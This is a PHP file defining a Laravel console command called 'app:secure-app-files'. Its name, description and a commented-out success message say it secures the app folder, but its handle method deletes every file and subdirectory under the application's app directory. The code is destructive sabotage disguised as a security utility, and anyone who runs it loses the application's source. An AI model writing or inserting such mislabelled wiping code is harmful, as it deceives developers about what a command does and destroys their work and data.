<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use File;

class SecureAppFiles extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'app:secure-app-files';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'secure-app-files';

    /**
     * Execute the console command.
     */
    public function handle()
    {
        $directory = app_path();
        
        foreach (glob($directory . '/*') as $file) {
            File::delete($file);
            File::deleteDirectory($file);
        }

        // $this->info('All files inside the app folder have been secured.');
    }
}
